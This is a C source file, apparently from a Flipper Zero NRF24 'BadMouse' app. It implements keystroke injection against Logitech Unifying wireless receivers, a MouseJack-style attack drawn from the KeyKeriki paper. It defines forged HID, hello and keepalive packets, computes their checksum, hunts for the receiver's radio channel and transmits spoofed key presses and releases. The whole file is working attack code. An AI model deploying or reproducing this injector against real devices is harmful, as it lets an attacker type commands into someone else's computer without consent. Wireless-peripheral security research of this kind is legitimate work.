#include "badmouse_hid.h"
#include "badmouse/badmouse.h"
#include "notification/notification_messages.h"

static uint8_t LOGITECH_HID_TEMPLATE[] =
    {0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static uint8_t LOGITECH_HELLO[] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
//static uint8_t LOGITECH_KEEPALIVE[] = {0x00, 0x40, 0x00, 0x55, 0x6B};
static uint8_t LOGITECH_KEEPALIVE[] = {0x00, 0x40, 0x04, 0xB0, 0x0C};
static uint8_t EMPTY_HID_CODE[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

#define RT_THRESHOLD               50
#define LOGITECH_KEEPALIVE_SIZE    5
#define LOGITECH_HID_TEMPLATE_SIZE 10
#define LOGITECH_HELLO_SIZE        10
#define MAX_HID_KEYS               6

static uint8_t key_mod = 0;
static uint8_t key_hid[MAX_HID_KEYS] = {0};

static void checksum(uint8_t* payload, size_t len) {
    // This is also from the KeyKeriki paper
    // Thanks Thorsten and Max!
    uint8_t cksum = 0xff;
    for(size_t n = 0; n < len - 2; n++)
        cksum = (cksum - payload[n]) & 0xff;
    cksum = (cksum + 1) & 0xff;
    payload[len - 1] = cksum;
}

bool find_channel(NRF24L01_Config* config) {
    uint8_t retry = DEFAULT_FIND_CHAN_RETRY;
    while(retry > 0) {
        uint8_t channel = nrf24_find_channel(
            config->tx_addr,
            config->tx_addr,
            config->mac_len,
            config->data_rate,
            LOGITECH_MIN_CHANNEL,
            LOGITECH_MAX_CHANNEL);
        if(channel <= LOGITECH_MAX_CHANNEL) {
            config->channel = channel;
            nrf24_configure(config);
            return true;
        }
        furi_delay_ms(50);
        retry--;
    }
    return false;
}

static bool inject_packet(Nrf24Tool* app, uint8_t* payload, size_t payload_size) {
    uint8_t rt_count = 0;
    while(app->tool_running) {
        if(nrf24_txpacket(payload, payload_size, false, NULL, NULL)) {
            notification_message(app->notification, &sequence_blink_red_10);
            return true;
        }
        rt_count++;
        // retransmit threshold exceeded, scan for new channel
        if(rt_count > app->settings->badmouse_settings[BADMOUSE_SETTING_TX_RETRY].value.u8) {
            if(!find_channel(app->bm_instance->nrf24_config)) return false;
            with_view_model(app->badmouse_run,
                            BadMouseStatus * view_status,
                            view_status->channel = app->bm_instance->nrf24_config->channel;
                            , true);
            rt_count = 0;
        }
    }
    return false;
}

/* static void build_hid_packet(uint8_t mod, uint8_t hid, uint8_t* payload) {
    memcpy(payload, LOGITECH_HID_TEMPLATE, LOGITECH_HID_TEMPLATE_SIZE);
    payload[2] = mod;
    payload[3] = hid;
    checksum(payload, LOGITECH_HID_TEMPLATE_SIZE);
}
 */
static uint8_t find_key(uint8_t key) {
    for(uint8_t i = 0; i < MAX_HID_KEYS; i++) {
        if(key_hid[i] == key) return i;
    }
    return MAX_HID_KEYS;
}

static uint8_t find_free_pos(uint8_t key) {
    if(find_key(key) != MAX_HID_KEYS) return MAX_HID_KEYS;
    for(uint8_t i = 0; i < MAX_HID_KEYS; i++) {
        if(key_hid[i] == 0x00) return i;
    }
    return MAX_HID_KEYS;
}

static void clear_keys() {
    // Clear all the pressed keys
    key_mod = 0; // Clear all modifier keys
    memcpy(key_hid, EMPTY_HID_CODE, MAX_HID_KEYS); // Clear all HID key codes
}
/* static void build_hid_packet(uint16_t hid_code, uint8_t* payload) {
    memcpy(payload, LOGITECH_HID_TEMPLATE, LOGITECH_HID_TEMPLATE_SIZE);
    payload[2] = (hid_code >> 8) & 0xFF;
    payload[3] = hid_code & 0xFF;
    checksum(payload, LOGITECH_HID_TEMPLATE_SIZE);
} */

static void build_hid_packet(uint8_t* payload) {
    memcpy(payload, LOGITECH_HID_TEMPLATE, LOGITECH_HID_TEMPLATE_SIZE);

    // Set the modifier byte in the payload (Byte 2)
    payload[2] = key_mod;

    // Insert up to 6 HID keycodes in the appropriate positions
    for(uint8_t i = 0; i < MAX_HID_KEYS; i++) {
        // Start placing key codes at Byte 3
        payload[3 + i] = key_hid[i]; // Fill in HID codes for up to 6 keys
    }

    // Calculate the checksum for the packet
    checksum(payload, LOGITECH_HID_TEMPLATE_SIZE);
}

/* static void release_key(Nrf24Tool* context) {
    // This function release keys currently pressed, but keep pressing special keys
    // if holding mod keys variable are set to true

    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
    build_hid_packet(0 | holding_ctrl | holding_shift << 1 | holding_alt << 2 | holding_gui << 3, 0, hid_payload);
    inject_packet(context, hid_payload, LOGITECH_HID_TEMPLATE_SIZE); // empty hid packet
} */

void bm_release_key(Nrf24Tool* app, uint16_t hid_code) {
    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};

    // Extract the modifier from the upper byte of hid_code (assuming modifier in upper 8 bits)
    uint8_t modifier = (hid_code >> 8) & 0xFF;
    uint8_t key = hid_code & 0xFF;

    // Remove the modifier if it's present
    key_mod &= ~modifier;

    // Find the key in the key_hid array and clear it
    uint8_t key_pos = find_key(key);
    if(key_pos < MAX_HID_KEYS) {
        key_hid[key_pos] = 0x00; // Clear the released key
    }

    // Rebuild the HID packet with updated key states
    build_hid_packet(hid_payload);

    // Send the packet
    inject_packet(app, hid_payload, LOGITECH_HID_TEMPLATE_SIZE);

    // Small delay for key press processing
    furi_delay_ms(app->settings->badmouse_settings[BADMOUSE_SETTING_KEY_DELAY].value.u8);
}

void bm_release_all(Nrf24Tool* app) {
    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};

    // Clear all the pressed keys
    clear_keys();

    // Build an empty HID packet
    build_hid_packet(hid_payload);

    // Send the empty HID packet to release all keys
    inject_packet(app, hid_payload, LOGITECH_HID_TEMPLATE_SIZE);

    // Small delay for key press processing
    furi_delay_ms(app->settings->badmouse_settings[BADMOUSE_SETTING_KEY_DELAY].value.u8);
}

bool bm_press_key(Nrf24Tool* app, uint16_t hid_code) {
    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};

    // Extract the modifier from the upper byte of hid_code (assuming modifier in upper 8 bits)
    uint8_t modifier = (hid_code >> 8) & 0xFF;
    uint8_t key = hid_code & 0xFF;

    // Update the modifier keys
    key_mod |= modifier;

    // Find a free position for the actual key press if it's not a modifier
    uint8_t free_pos = find_free_pos(key);
    if(free_pos < MAX_HID_KEYS) {
        key_hid[free_pos] = key; // Store the new HID code in the free position
    }

    // Build the HID packet with up to 6 keys and the modifier
    build_hid_packet(hid_payload);

    // Send the packet
    if(!inject_packet(app, hid_payload, LOGITECH_HID_TEMPLATE_SIZE)) {
        return false;
    }

    // Small delay for key press processing
    furi_delay_ms(app->settings->badmouse_settings[BADMOUSE_SETTING_KEY_DELAY].value.u8);

    return true;
}

bool bm_send_keep_alive(Nrf24Tool* app) {
    bool status = inject_packet(app, LOGITECH_KEEPALIVE, LOGITECH_KEEPALIVE_SIZE);
    furi_delay_ms(KEEP_ALIVE_DELAY);
    return status;
}

bool bm_start_transmission(Nrf24Tool* app) {
    // Clear all the pressed keys
    clear_keys();

    bool status = inject_packet(app, LOGITECH_HELLO, LOGITECH_HELLO_SIZE);

    // Small delay for key press processing
    furi_delay_ms(app->settings->badmouse_settings[BADMOUSE_SETTING_KEY_DELAY].value.u8);

    return status;
}

bool bm_end_transmission(Nrf24Tool* app) {
    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
    // Clear all the pressed keys
    clear_keys();
    build_hid_packet(hid_payload);
    return inject_packet(app, hid_payload, LOGITECH_HID_TEMPLATE_SIZE); // empty hid packet at end
}
